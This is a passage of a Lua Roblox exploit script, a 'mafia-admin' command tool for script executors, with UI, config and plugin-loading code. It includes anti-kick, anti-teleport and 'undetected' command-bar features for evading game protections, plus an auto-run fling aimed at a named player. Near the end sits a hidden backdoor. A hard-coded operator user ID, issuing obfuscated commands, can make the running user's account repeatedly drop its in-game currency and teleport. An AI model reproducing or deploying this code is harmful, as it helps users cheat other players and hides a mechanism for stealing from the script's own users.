                        if Input.UserInputType == Enum.UserInputType.MouseButton1 and Moving then
                            Moving = false
                        end
                    end))
                    
                    AddConnection(CConnect(Mouse.Move, Utils.Debounce(function()
                        if Moving then
                            Update()
                        end
                    end)))
                end
                local function ColorCanvasInit()
                    local Moving = false
                    
                    local function Update()
                        if Opened then
                            local LowerBound = CanvasHitbox.AbsoluteSize.Y
                            local YPosition = clamp(Mouse.Y - CanvasHitbox.AbsolutePosition.Y, 0, LowerBound)
                            local YValue = YPosition / LowerBound
                            local RightBound = CanvasHitbox.AbsoluteSize.X
                            local XPosition = clamp(Mouse.X - CanvasHitbox.AbsolutePosition.X, 0, RightBound)
                            local XValue = XPosition / RightBound
                            
                            S = XValue
                            V = 1 - YValue
                            
                            CurrentColor = Color3fromHSV(H, S, V);
                            ColorPreview.BackgroundColor3 = CurrentColor
                            UpdateText()
                            
                            local Position = UDim2New(XValue, 2, YValue, 2);
                            local Tween = Utils.Tween(CanvasBar, "Linear", "Out", .05, {
                                Position = Position
                            });
                            Callback(CurrentColor);
                            CWait(Tween.Completed);
                        end
                    end
                
                    AddConnection(CConnect(CanvasHitbox.MouseButton1Down, function()
                        Moving = true
                        Update()
                    end))
                    
                    AddConnection(CConnect(UserInputService.InputEnded, function(Input)
                        if Input.UserInputType == Enum.UserInputType.MouseButton1 and Moving then
                            Moving = false
                        end
                    end))
                    
                    AddConnection(CConnect(Mouse.Move, Utils.Debounce(function()
                        if Moving then
                            Update()
                        end
                    end)))
                end
                
                ColorSliderInit()
                ColorCanvasInit()
                
                AddConnection(CConnect(Button.MouseButton1Click, function()
                    if not Opened then
                        Opened = true
                        UpdateColor()
                        RainbowToggle.Container.Switch.Position = Rainbow and UDim2New(1, -18, 0, 2) or UDim2.fromOffset(2, 2)
                        RainbowToggle.Container.BackgroundColor3 = Color3.fromRGB(25, 25, 25);
                        Overlay.Visible = true
                        OverlayMain.Visible = false
                        Utils.Intro(OverlayMain)
                    end
                end))
                
                AddConnection(CConnect(ClosePicker.MouseButton1Click, Utils.Debounce(function()
                    Button.BackgroundColor3 = CurrentColor
                    Utils.Intro(OverlayMain)
                    Overlay.Visible = false
                    Opened = false
                end)))
                
                AddConnection(CConnect(RedTextBox.FocusLost, function()
                    if Opened then
                        local Number = tonumber(RedTextBox.Text)
                        if Number then
                            Number = clamp(floor(Number), 0, 255)
                            CurrentColor = Color3New(Number / 255, CurrentColor.G, CurrentColor.B)
                            UpdateColor()
                            RedTextBox.PlaceholderText = tostring(Number)
                            Callback(CurrentColor)
                        end
                        RedTextBox.Text = ""
                    end
                end))
                
                AddConnection(CConnect(GreenTextBox.FocusLost, function()
                    if Opened then
                        local Number = tonumber(GreenTextBox.Text)
                        if Number then
                            Number = clamp(floor(Number), 0, 255)
                            CurrentColor = Color3New(CurrentColor.R, Number / 255, CurrentColor.B)
                            UpdateColor()
                            GreenTextBox.PlaceholderText = tostring(Number)
                            Callback(CurrentColor)
                        end
                        GreenTextBox.Text = ""
                    end
                end))
                
                AddConnection(CConnect(BlueTextBox.FocusLost, function()
                    if Opened then
                        local Number = tonumber(BlueTextBox.Text)
                        if Number then
                            Number = clamp(floor(Number), 0, 255)
                            CurrentColor = Color3New(CurrentColor.R, CurrentColor.G, Number / 255)
                            UpdateColor()
                            BlueTextBox.PlaceholderText = tostring(Number)
                            Callback(CurrentColor)
                        end
                        BlueTextBox.Text = ""
                    end
                end))
                
                Utils.ToggleFunction(RainbowToggle.Container, false, function(Callback)
                    if Opened then
                        Rainbow = Callback
                    end
                end)
                
                AddConnection(CConnect(RenderStepped, function()
                    if Rainbow then
                        local Hue = (tick() / 5) % 1
                        CurrentColor = Color3.fromHSV(Hue, S, V)
                        
                        if Opened then
                            UpdateHue(Hue)
                        end
                        
                        Button.BackgroundColor3 = CurrentColor
                        Callback(CurrentColor, true);
                    end
                end))
                                
                Button.BackgroundColor3 = DefaultColor
                SelectColor.Title.Text = Title
                SelectColor.Visible = true
                SelectColor.Parent = Section.Options
                Utils.Thing(SelectColor.Title);
            end

            return ElementLibrary
        end

        return PageLibrary
    end
end

Utils.Click(ConfigUI.Close, "TextColor3")
AddConnection(CConnect(ConfigUI.Close.MouseButton1Click, function()
    ConfigLoaded = false
    CWait(Utils.TweenAllTrans(ConfigUI, .25).Completed);
    ConfigUI.Visible = false
end))
--END IMPORT [uimore]


--IMPORT [plugin]
PluginConf = IsSupportedExploit and GetPluginConfig();
local Plugins;

PluginLibrary = {
    LocalPlayer = LocalPlayer,
    Services = Services,
    GetCharacter = GetCharacter,
    ProtectInstance = ProtectInstance,
    SpoofInstance = SpoofInstance,
    SpoofProperty = SpoofProperty,
    UnSpoofInstance = UnSpoofInstance,
    ReplaceCharacter = ReplaceCharacter,
    ReplaceHumanoid = ReplaceHumanoid,
    GetCorrectToolWithHandle = GetCorrectToolWithHandle,
    DisableAnimate = DisableAnimate,
    GetPlayer = GetPlayer,
    GetHumanoid = GetHumanoid,
    GetRoot = GetRoot,
    GetMagnitude = GetMagnitude,
    GetCommandEnv = function(Name)
        local Command = LoadCommand(Name);
        if (Command.CmdEnv) then
            return Command.CmdEnv
        end
    end,
    isR6 = isR6,
    ExecuteCommand = ExecuteCommand,
    Notify = Utils.Notify,
    HasTool = HasTool,
    isSat = isSat,
    Request = syn and syn.request or request or game.HttpGet,
    CThread = CThread,
    AddConnection = AddConnection,
    filter = filter,
    map = map,
    clone = clone,
    firetouchinterest = firetouchinterest,
    fireproximityprompt = fireproximityprompt,
    decompile = decompile,
    getnilinstances = getnilinstances,
    getinstances = getinstances,
    Drawing = Drawing
}

do
    local IsDebug = IsSupportedExploit and PluginConf.PluginDebug
    
    Plugins = IsSupportedExploit and map(filter(listfiles("mafia-admin/plugins"), function(i, v)
        return lower(split(v, ".")[#split(v, ".")]) == "lua"
    end), function(i, v)
        local splitted = split(v, "\\");
        if (identifyexecutor and identifyexecutor() == "ScriptWare") then
            return {splitted[#splitted], loadfile("mafia-admin/plugins/" .. v)}
        else
            return {splitted[#splitted], loadfile(v)}
        end
    end) or {}

    local Renv = clone(getrenv(), true);
    for i, v in next, Renv do
        PluginLibrary[i] = v
    end
    PluginLibrary.debug = nil
    PluginLibrary.getfenv = nil

    if (PluginConf.SafePlugins) then
        local Funcs = {}
        for i, v in next, PluginLibrary do
            if (type(v) == 'function') then
                Funcs[#Funcs + 1] = v
            end
        end
        local FateEnv = getfenv(1);
        PluginLibrary.getfenv = newcclosure(function(...)
            local f = ({...})[1]
            local Env = getfenv(...);
            if (type(f) == 'function' and Tfind(Funcs, f) or Env == FateEnv and checkcaller()) then
                return PluginLibrary
            end
            return Env
        end)
    end

    if (PluginConf.PluginsEnabled) then
        local LoadPlugin = function(Plugin)
            if (not IsSupportedExploit) then
                return 
            end
        
            if (Plugin and PluginConf.DisabledPlugins[Plugin.Name]) then
                Utils.Notify(LocalPlayer, "Plugin not loaded.", format("Plugin %s was not loaded as it is on the disabled list.", Plugin.Name));
                return "Disabled"
            end
            if (#keys(Plugin) < 3) then
                return Utils.Notify(LocalPlayer, "Plugin Fail", "One of your plugins is missing information.");
            end
            if (IsDebug) then
                Utils.Notify(LocalPlayer, "Plugin loading", format("Plugin %s is being loaded.", Plugin.Name));
            end
            
            local Context;
            local sett, gett = setthreadidentity, getthreadidentity
            if (sett and PluginConf.SafePlugins) then
                Context = gett();
                sett(5);
            end
            local Ran, Return = pcall(Plugin.Init);
            if (sett and Context) then
                sett(Context);
            end
            if (not Ran and Return and IsDebug) then
                return Utils.Notify(LocalPlayer, "Plugin Fail", format("there is an error in plugin Init %s: %s", Plugin.Name, Return));
            end
            
            for i, command in next, Plugin.Commands or {} do -- adding the "or" because some people might have outdated plugins in the dir
                if (#keys(command) < 3) then
                    Utils.Notify(LocalPlayer, "Plugin Command Fail", format("Command %s is missing information", command.Name));
                    continue
                end
                AddCommand(command.Name, command.Aliases or {}, command.Description .. " - " .. Plugin.Author, command.Requirements or {}, command.Func, true);
        
                if (FindFirstChild(Commands.Frame.List, command.Name)) then
                    Destroy(FindFirstChild(Commands.Frame.List, command.Name));
                end
                local Clone = Clone(Command);
                Utils.Hover(Clone, "BackgroundColor3");
                Utils.ToolTip(Clone, format("%s\n%s - %s", command.Name, command.Description, Plugin.Author));
                Clone.CommandText.RichText = true
                Clone.CommandText.Text = format("%s %s %s", command.Name, next(command.Aliases or {}) and format("(%s)", concat(command.Aliases, ", ")) or "", Utils.TextFont("[PLUGIN]", {77, 255, 255}));
                Clone.Name = command.Name
                Clone.Visible = true
                Clone.Parent = Commands.Frame.List
                if (IsDebug) then
                    Utils.Notify(LocalPlayer, "Plugin Command Loaded", format("Command %s loaded successfully", command.Name));
                end
            end
        end
        
        if (IsSupportedExploit) then
            if (not isfolder("mafia-admin") and not isfolder("mafia-admin/plugins") and not isfolder("mafia-admin/plugin-conf.json") or not isfolder("mafia-admin/chatlogs")) then
                WriteConfig();
            end
        end

        for i, Plugin in next, Plugins do
            local PluginFunc = Plugin[2]
            if (PluginConf.SafePlugins) then
                setfenv(PluginFunc, PluginLibrary);
            else
                local CurrentEnv = getfenv(PluginFunc);
                for i2, v2 in next, PluginLibrary do
                    CurrentEnv[i2] = v2
                end
            end
            local Success, Ret = pcall(PluginFunc);
            if (Success) then
                LoadPlugin(Ret);
            elseif (PluginConf.PluginDebug) then
                Utils.Notify(LocalPlayer, "Fail", "There was an error Loading plugin (console for more information)");
                warn("[FA Plugin Error]: " .. debug.traceback(Ret));             
            end
        end
        
        AddCommand("refreshplugins", {"rfp", "refreshp", "reloadp"}, "Loads all new plugins.", {}, function()
            if (not IsSupportedExploit) then
                return "your exploit does not support plugins"
            end
            PluginConf = GetPluginConfig();
            IsDebug = PluginConf.PluginDebug
            
            Plugins = map(filter(listfiles("mafia-admin/plugins"), function(i, v)
                return lower(split(v, ".")[#split(v, ".")]) == "lua"
            end), function(i, v)
                return {split(v, "\\")[2], loadfile(v)}
            end)
            
            for i, Plugin in next, Plugins do
                local PluginFunc = Plugin[2]
                setfenv(PluginFunc, PluginLibrary);
                local Success, Ret = pcall(PluginFunc);
                if (Success) then
                    LoadPlugin(Ret);
                elseif (PluginConf.PluginDebug) then
                    Utils.Notify(LocalPlayer, "Fail", "There was an error Loading plugin (console for more information)");
                    warn("[FA Plugin Error]: " .. debug.traceback(Ret));             
                end
            end
        end)
    end
end
--END IMPORT [plugin]


WideBar = false
Draggable = false

--IMPORT [config]
do
    local UserInputService = Services.UserInputService
    local GetStringForKeyCode = UserInputService.GetStringForKeyCode
    local function GetKeyName(KeyCode)
        local _, Stringed = pcall(GetStringForKeyCode, UserInputService, KeyCode);
        local IsEnum = Stringed == ""
        return (not IsEnum and _) and Stringed or split(tostring(KeyCode), ".")[3], (IsEnum and not _);
    end

    local SortKeys = function(Key1, Key2)
        local KeyName, IsEnum = GetKeyName(Key1);
        if (Key2) then
            local KeyName2, IsEnum2 = GetKeyName(Key2);
            return format("%s + %s", IsEnum2 and KeyName2 or KeyName, IsEnum2 and KeyName2 or KeyName2);
        end
        return KeyName
    end

    LoadConfig = function()
        local Script = ConfigUILib.NewPage("Script");
        local Settings = Script.NewSection("Settings");
    
        local CurrentConf = GetConfig();
        UndetectedCmdBar = CurrentConf.UndetectedCmdBar


        Settings.TextboxKeybind("Chat Prefix", Prefix, function(Key)
            if (not match(Key, "%A") or match(Key, "%d") or #Key > 1) then
                Utils.Notify(nil, "Prefix", "Prefix must be a 1 character symbol.");
                return
            end
            Prefix = Key
            Utils.Notify(nil, "Prefix", "Prefix is now " .. Key);
        end)
    
        Settings.Keybind("CMDBar Prefix", GetKeyName(CommandBarPrefix), function(KeyCode1, KeyCode2)
            CommandBarPrefix = KeyCode1
            Utils.Notify(nil, "Prefix", "CommandBar Prefix is now " .. GetKeyName(KeyCode1));
        end)
    
        local ToggleSave;
        ToggleSave = Settings.Toggle("Save Prefix's", false, function(Callback)
            SetConfig({["Prefix"]=Prefix,["CommandBarPrefix"]=split(tostring(CommandBarPrefix), ".")[3]});
            wait(.5);
            ToggleSave();
            Utils.Notify(nil, "Prefix", "saved prefix's");
        end)
    
        local Misc = Script.NewSection("Misc");

        Misc.Toggle("Chat Prediction", CurrentConf.ChatPrediction or false, function(Callback)
            local ChatBar = ToggleChatPrediction();
            if (Callback) then
                ChatBar.CaptureFocus(ChatBar);
                wait();
                ChatBar.Text = Prefix
            end
            SetConfig({ChatPrediction=Callback});
            Utils.Notify(nil, nil, format("ChatPrediction %s", Callback and "enabled" or "disabled"));
        end)

        Misc.Toggle("Undetected CommandBar", UndetectedCmdBar, function(Callback)
            SetConfig({UndetectedCmdBar=Callback});
        end)

        Misc.Toggle("Anti Kick", Hooks.AntiKick, function(Callback)
            Hooks.AntiKick = Callback
            Utils.Notify(nil, nil, format("AntiKick %s", Hooks.AntiKick and "enabled" or "disabled"));
        end)

        Misc.Toggle("Anti Teleport", Hooks.AntiTeleport, function(Callback)
            Hooks.AntiTeleport = Callback
            Utils.Notify(nil, nil, format("AntiTeleport %s", Hooks.AntiTeleport and "enabled" or "disabled"));
        end)

        Misc.Toggle("wide cmdbar", WideBar, function(Callback)
            WideBar = Callback
            if (not Draggable) then
                Utils.Tween(CommandBar, "Quint", "Out", .5, {
                    Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5) -- tween -110
                })
            end
            Utils.Tween(CommandBar, "Quint", "Out", .5, {
                Size = UDim2.new(0, WideBar and 400 or 200, 0, 35) -- tween -110
            })
            SetConfig({WideBar=Callback});
            Utils.Notify(nil, nil, format("widebar %s", WideBar and "enabled" or "disabled"));
        end)

        Misc.Toggle("draggable cmdbar", Draggable, function(Callback)
            Draggable = Callback
            CommandBarOpen = true
            Utils.Tween(CommandBar, "Quint", "Out", .5, {
                Position = UDim2.new(0, Mouse.X, 0, Mouse.Y + 36);
            })
            Utils.Draggable(CommandBar);
            local TransparencyTween = CommandBarOpen and Utils.TweenAllTransToObject or Utils.TweenAllTrans
            local Tween = TransparencyTween(CommandBar, .5, CommandBarTransparencyClone);
            CommandBar.Input.Text = ""
            if (not Callback) then
                Utils.Tween(CommandBar, "Quint", "Out", .5, {
                    Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5) -- tween 5
                })
            end
            Utils.Notify(nil, nil, format("draggable command bar %s", Draggable and "enabled" or "disabled"));
        end)

        Misc.Toggle("KillCam when killing", CurrentConf.KillCam, function(Callback)
            SetConfig({KillCam=Callback});
            _L.KillCam = Callback
        end)

        local OldFireTouchInterest = firetouchinterest
        Misc.Toggle("cframe touchinterest", firetouchinterest == nil, function(Callback)
            firetouchinterest = Callback and function(part1, part2, toggle)
                if (part1 and part2) then
                    if (toggle == 0) then
                        touched[1] = part1.CFrame
                        part1.CFrame = part2.CFrame
                    else
                        part1.CFrame = touched[1]
                        touched[1] = nil
                    end
                end
            end or OldFireTouchInterest
        end)

        local MacrosPage = ConfigUILib.NewPage("Macros");
        local MacroSection;
        MacroSection = MacrosPage.CreateMacroSection(Macros, function(Bind, Command, Args)
            local AlreadyAdded = false
            for i = 1, #Macros do
                if (Macros[i].Command == Command) then
                    AlreadyAdded = true
                end
            end
            if (CommandsTable[Command] and not AlreadyAdded) then
                MacroSection.AddMacro(Command .. " " .. Args, SortKeys(Bind[1], Bind[2]));
                Args = split(Args, " ");
                if (sub(Command, 1, 2) == "un" or CommandsTable["un" .. Command]) then
                    local Shifted = {Command, unpack(Args)}
                    Macros[#Macros + 1] = {
                        Command = "toggle",
                        Args = Shifted,
                        Keys = Bind
                    }
                else
                    Macros[#Macros + 1] = {
                        Command = Command,
                        Args = Args,
                        Keys = Bind
                    }
                end
                local TempMacros = clone(Macros);
                for i, v in next, TempMacros do
                    for i2, v2 in next, v.Keys do
                        TempMacros[i]["Keys"][i2] = split(tostring(v2), ".")[3]
                    end
                end
                SetConfig({Macros=TempMacros});
            end
        end)
        local UIListLayout = MacroSection.CommandsList.UIListLayout
        for i, v in next, CommandsTable do
            if (not FindFirstChild(MacroSection.CommandsList, v.Name)) then
                MacroSection.AddCmd(v.Name);
            end
        end
        MacroSection.CommandsList.CanvasSize = UDim2.fromOffset(0, UIListLayout.AbsoluteContentSize.Y);
        local Search = FindFirstChild(MacroSection.CommandsList.Parent.Parent, "Search");

        AddConnection(CConnect(GetPropertyChangedSignal(Search, "Text"), function()
            local Text = Search.Text
            for _, v in next, GetChildren(MacroSection.CommandsList) do
                if (IsA(v, "TextButton")) then
                    local Command = v.Text
                    v.Visible = Sfind(lower(Command), Text, 1, true)
                end
            end
            MacroSection.CommandsList.CanvasSize = UDim2.fromOffset(0, UIListLayout.AbsoluteContentSize.Y);
        end), Connections.UI, true);
        
        local PluginsPage = ConfigUILib.NewPage("Plugins");
        
        local CurrentPlugins = PluginsPage.NewSection("Current Plugins");
        local PluginSettings = PluginsPage.NewSection("Plugin Settings");
    
        local CurrentPluginConf = GetPluginConfig();
    
        CurrentPlugins.ScrollingFrame("plugins", function(Option, Enabled)
            CurrentPluginConf = GetPluginConfig();
            for i = 1, #Plugins do
                local Plugin = Plugins[i]
                if (Plugin[1] == Option) then
                    local DisabledPlugins = CurrentPluginConf.DisabledPlugins
                    local PluginName = Plugin[2]().Name
                    if (Enabled) then
                        DisabledPlugins[PluginName] = nil
                        SetPluginConfig({DisabledPlugins=DisabledPlugins});
                        Utils.Notify(nil, "Plugin Enabled", format("plugin %s successfully enabled", PluginName));
                    else
                        DisabledPlugins[PluginName] = true
                        SetPluginConfig({DisabledPlugins=DisabledPlugins});
                        Utils.Notify(nil, "Plugin Disabled", format("plugin %s successfully disabled", PluginName));
                    end
                end
            end
        end, map(Plugins, function(Key, Plugin)
            return not PluginConf.DisabledPlugins[Plugin[2]().Name], Plugin[1]
        end));
    
        PluginSettings.Toggle("Plugins Enabled", CurrentPluginConf.PluginsEnabled, function(Callback)
            SetPluginConfig({PluginsEnabled = Callback});
        end)

        PluginSettings.Toggle("Plugins Debug", CurrentPluginConf.PluginDebug, function(Callback)
            SetPluginConfig({PluginDebug = Callback});
        end)

        PluginSettings.Toggle("Safe Plugins", CurrentPluginConf.SafePlugins, function(Callback)
            SetPluginConfig({SafePlugins = Callback});
        end)

        local Themes = ConfigUILib.NewPage("Themes");

        local Color = Themes.NewSection("Colors");
        local Options = Themes.NewSection("Options");

        local RainbowEnabled = false
        Color.ColorPicker("All Background", UITheme.Background.BackgroundColor, function(Callback, IsRainbow)
            UITheme.Background.BackgroundColor = Callback
            RainbowEnabled = IsRainbow
        end)
        Color.ColorPicker("CommandBar", UITheme.CommandBar.BackgroundColor, function(Callback)
            if (not RainbowEnabled) then
                UITheme.CommandBar.BackgroundColor = Callback
            end
        end)
        Color.ColorPicker("Notification", UITheme.Notification.BackgroundColor, function(Callback)
            if (not RainbowEnabled) then
                UITheme.Notification.BackgroundColor = Callback
            end
        end)
        Color.ColorPicker("ChatLogs", UITheme.ChatLogs.BackgroundColor, function(Callback)
            if (not RainbowEnabled) then
                UITheme.ChatLogs.BackgroundColor = Callback
            end
        end)
        Color.ColorPicker("CommandList", UITheme.CommandList.BackgroundColor, function(Callback)
            if (not RainbowEnabled) then
                UITheme.CommandList.BackgroundColor = Callback
            end
        end)
        Color.ColorPicker("Config", UITheme.Config.BackgroundColor, function(Callback)
            if (not RainbowEnabled) then
                UITheme.Config.BackgroundColor = Callback
            end
        end)

        Color.ColorPicker("All Text", UITheme.Background.TextColor, function(Callback)
            UITheme.Background.TextColor = Callback
        end)

        local ToggleSave;
        ToggleSave = Options.Toggle("Save Theme", false, function(Callback)
            WriteThemeConfig();
            wait(.5);
            ToggleSave();
            Utils.Notify(nil, "Theme", "saved theme");
        end)

        local ToggleLoad;
        ToggleLoad = Options.Toggle("Load Theme", false, function(Callback)
            LoadTheme(GetThemeConfig());
            wait(.5);
            ToggleLoad();
            Utils.Notify(nil, "Theme", "Loaded theme");
        end)

        local ToggleReset;
        ToggleReset = Options.Toggle("Reset Theme", false, function(Callback)
            UITheme.Background.BackgroundColor = "Reset"
            UITheme.Notification.TextColor = "Reset"
            UITheme.CommandBar.TextColor = "Reset"
            UITheme.CommandList.TextColor = "Reset"
            UITheme.ChatLogs.TextColor = "Reset"
            UITheme.Config.TextColor = "Reset"
            UITheme.Notification.Transparency = "Reset"
            UITheme.CommandBar.Transparency = "Reset"
            UITheme.CommandList.Transparency = "Reset"
            UITheme.ChatLogs.Transparency = "Reset"
            UITheme.Config.Transparency = "Reset"
            wait(.5);
            ToggleReset();
            Utils.Notify(nil, "Theme", "reset theme");
        end)

    end

    delay(1, function()
        for i = 1, #Macros do
            local Macro = Macros[i]
            for i2 = 1, #Macro.Keys do
                Macros[i].Keys[i2] = Enum.KeyCode[Macros[i].Keys[i2]]
            end
        end
        if (CurrentConfig.WideBar) then
            WideBar = true
            Utils.Tween(CommandBar, "Quint", "Out", .5, {
                Size = UDim2.new(0, WideBar and 400 or 200, 0, 35) -- tween -110
            })
        end
        KillCam = CurrentConfig.KillCam
        local Aliases = CurrentConfig.Aliases
        if (Aliases) then
            for i, v in next, Aliases do
                if (CommandsTable[i]) then
                    for i2 = 1, #v do
                        local Alias = v[i2]
                        local Add = CommandsTable[i]
                        Add.Name = Alias
                        CommandsTable[Alias] = Add
                    end
                end
            end
        end
    end)
end
--END IMPORT [config]


AddConnection(CConnect(CommandBar.Input.FocusLost, function()
    if (UndetectedCmdBar) then
        CThread(function()
            wait(.3);
            for i, v in next, getconnections(Services.UserInputService.TextBoxFocusReleased) do
                v.Enable(v);
            end
        end)()
    end

    local Text = trim(CommandBar.Input.Text);
    local CommandArgs = split(Text, " ");

    CommandBarOpen = false

    if (not Draggable) then
        Utils.TweenAllTrans(CommandBar, .5)
        Utils.Tween(CommandBar, "Quint", "Out", .5, {
            Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5); -- tween 5
        })
    end

    local Command = CommandArgs[1]
    local Args = shift(CommandArgs);

    if (Command ~= "") then
        ExecuteCommand(Command, Args, LocalPlayer);
    end
end), Connections.UI, true);

local PlayerAdded = function(plr)
    RespawnTimes[plr.Name] = tick();
    AddConnection(CConnect(plr.CharacterAdded, function()
        RespawnTimes[plr.Name] = tick();
    end));
end

forEach(GetPlayers(Players), function(i,v)
    PlrChat(i,v);
    PlayerAdded(v);
end);

AddConnection(CConnect(Players.PlayerAdded, function(plr)
    PlrChat(#Connections.Players + 1, plr);
    PlayerAdded(plr);
end))

AddConnection(CConnect(Players.PlayerRemoving, function(plr)
    if (Connections.Players[plr.Name]) then
        if (Connections.Players[plr.Name].ChatCon) then
            Disconnect(Connections.Players[plr.Name].ChatCon);
        end
        Connections.Players[plr.Name] = nil
    end
    if (RespawnTimes[plr.Name]) then
        RespawnTimes[plr.Name] = nil
    end
end))

getgenv().F_A = {
    Utils = Utils,
    PluginLibrary = PluginLibrary,
    GetConfig = GetConfig
}

if (debug.info(2, "f") == nil) then
        Notify({ 
Description = "use the loadstring or the cmd 'reloadscript' to get the newest version";
Title = "this script is potentially outdated";
Duration = 2;
});
end


idkfakethingy = true
timeusagesecondslol = 0
timeusageminuteslol = 0
timeusagehourslol = 0

local L_11_ = "+"
local L_21_ = game.Players.LocalPlayer:GetMouse()
L_21_.KeyDown:Connect(
    function(L_221_arg0)
	if L_221_arg0 == L_11_ then
print("a")
ExecuteCommand("unattack", {}, LocalPlayer);
auraing = false
ExecuteCommand("unstand", {}, LocalPlayer);
ExecuteCommand("uncircle", {}, LocalPlayer);
	end
end
)


			for _, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
				if v:IsA("Script") and v.Name ~= "Health" and v.Name ~= "Sound" and v:FindFirstChild("LocalScript") then
					v:Destroy()
				end
			end
			game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
				repeat
					wait()
				until game.Players.LocalPlayer.Character
				char.ChildAdded:Connect(function(child)
					if child:IsA("Script") then 
						wait(0.1)
						if child:FindFirstChild("LocalScript") then
							child.LocalScript:FireServer()
						end
					end
				end)
			end)





















mafiacmdsloaded = true
permsonce = false

while true do
wait(1)
if mafiajoinedserver == true then
mafiajoinedserver = false
print("joined")
ExecuteCommand("flingwl", {"xxxLX_0GANxxx"}, LocalPlayer);
end
if mafiajoinedserver == true and mafiacmdsloaded == false then
mafiacmdsloaded = true
local player = game.Players.LocalPlayer

getgenv().Prefix = ">"

getgenv().Operator = {2977240591}
getgenv().Droppers = {}


local player = game.Players.LocalPlayer



local function notify(a,b,c)
    game.StarterGui:SetCore("SendNotification",{
        Title = a;
        Text = b;
        Duration = c;
    })
end

local function annouce(anc)
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, 'All')
end

local function fancynum(num)
    num = tostring(num)
    return num:reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end

local isaopeartor = false

local success, err = pcall(function()
    if table.find(Operator,player.UserId) then
        notify("Operator","Permission granted.",10)
        isaopeartor = true
    else
getgenv().Droppers = {player.UserId}
    end
end)
if err then notify("Error!","Error occured!",5) return end

local origin_spot
local adver_msg
local hidden_origin_spot

local dropping = false
local blocking = false
local advert = false

local function main_cmds(msg,plr)
    if isaopeartor == false or table.find(Operator,plr) then
        local operator = game.Players:GetPlayerByUserId(plr)
        msg = string.lower(msg)
        cmd = string.split(msg," ")
        if cmd[2] and cmd[1] then
            if cmd[1] == Prefix.."s454545456666666etup" then
                local places = {"admin"}
                if table.find(places,cmd[2]) then
                    local success, err = pcall(function()
                        if cmd[2] == 'admin' then
                            local pos = {
                                a1 = "-871,-39,-589",
                                a2 = "-871,-39,-619",
                                a3 = "-906,-40,-620",
                                a4 = "-907,-39,-590",
                                a5 = "-908,-40,-561",
                                a6 = "-873,-39,-559",
                                a7 = "-837,-40,-559",
                                a8 = "-836,-39,-590",
                                a9 = "-837,-40,-619",
                                a10 = "-856,-39,-606",
                                a11 = "-871,-39,-606",
                                a12 = "-887,-39,-606",
                                a13 = "-887,-39,-590",
                                a14 = "-886,-39,-573",
                                a15 = "-872,-39,-574",
                                a16 = "-857,-39,-574",
                                a17 = "-856,-39,-588",
                                a18 = "-820,-40,-629",
                                a19 = "-922,-40,-629",
                                a20 = "-924,-40,-550",
                                a21 = "-821,-40,-549",
                                a22 = "-864,-39,-580",
                                a23 = "-864,-39,-580",
                                a24 = "-881,-39,-580",
                                a25 = "-881,-39,-600",
                                a26 = "-864,-39,-600",
                            }
                            local cnt = 0
                            for i,v in pairs(Droppers) do
                                if game.Players:GetPlayerByUserId(v) then
                                    cnt = cnt + 1
                                    local new_pos = pos['a'..cnt]
                                    local split_cframe = string.split(new_pos,",")
                                    local x,y,z = split_cframe[1],split_cframe[2],split_cframe[3]
                                    game.Players:GetPlayerByUserId(v).Character.HumanoidRootPart.CFrame = CFrame.new(x,y,z)
                                end
                            end
                            if game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored == true then
                                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
                            end
                            local HumanoidRootPart_ = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(HumanoidRootPart_.X,HumanoidRootPart_.Y+7,HumanoidRootPart_.Z)
                            wait()
                            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
                        end
                    end)
                    if err then print(err) end
                end
            elseif cmd[1] == Prefix.."dro666666666666666p" then
                if cmd[2] == "." then
                    annouce(player.Name.." started dropping!")
                    dropping = true
                    repeat
                        local dropamt = 10000
                        if player.DataFolder.Currency.Value >= 10000 then
                            dropamt = 10000
                        else
                            dropamt = player.DataFolder.Currency.Value
                        end
                        game.ReplicatedStorage.MainEvent:FireServer("DropMoney",dropamt)
                        wait(0.1)
                    until dropping == false
                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
                    dropping = true
                    annouce(player.Name.." started dropping!")
                    repeat
                        local dropamt = 10000
                        if player.DataFolder.Currency.Value >= 10000 then
                            dropamt = 10000
                        else
                            dropamt = player.DataFolder.Currency.Value
                        end
                        game.ReplicatedStorage.MainEvent:FireServer("DropMoney",dropamt)
                        wait(0.1)
                    until dropping == false
                end
            elseif cmd[1] == Prefix.."u6666666666666666666ndrop" then
                if cmd[2] == "." then
                    annouce(player.Name.." stopped dropping!")
                    dropping = false
                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
                    dropping = false
                    annouce(player.Name.." stopped dropping!")
                end
            elseif cmd[1] == Prefix.."blo666666666666666666666666666ck" then
                if cmd[2] == "." then
                    annouce(player.Name.." started blocking!")
                    blocking = true
                    repeat
                        game.ReplicatedStorage.MainEvent:FireServer("Block",true)
                        wait(0.1)
                    until blocking == false
                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
                    annouce(player.Name.." started blocking!")
                    blocking = true
                    repeat
                        game.ReplicatedStorage.MainEvent:FireServer("Block",true)
                        wait(0.1)
                    until blocking == false
                end
            elseif cmd[1] == Prefix.."unbl66666666666666666666666666666ock" then
                if cmd[2] == "." then
                    annouce(player.Name.." stopped blocking!")
                    blocking = false
                    game.ReplicatedStorage.MainEvent:FireServer("Block",false)
                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
                    annouce(player.Name.." stopped blocking!")
                    blocking = false
                    game.ReplicatedStorage.MainEvent:FireServer("Block",false)
                end
            elseif cmd[1] == Prefix.."bri66666666666ng" then
                if cmd[2] == "." then
                    player.Character.HumanoidRootPart.CFrame = operator.Character.HumanoidRootPart.CFrame
                elseif (string.sub(string.lower(player.Name),1,string.len(cmd[2]))) == string.lower(cmd[2]) then
                    player.Character.HumanoidRootPart.CFrame = operator.Character.HumanoidRootPart.CFrame
                end
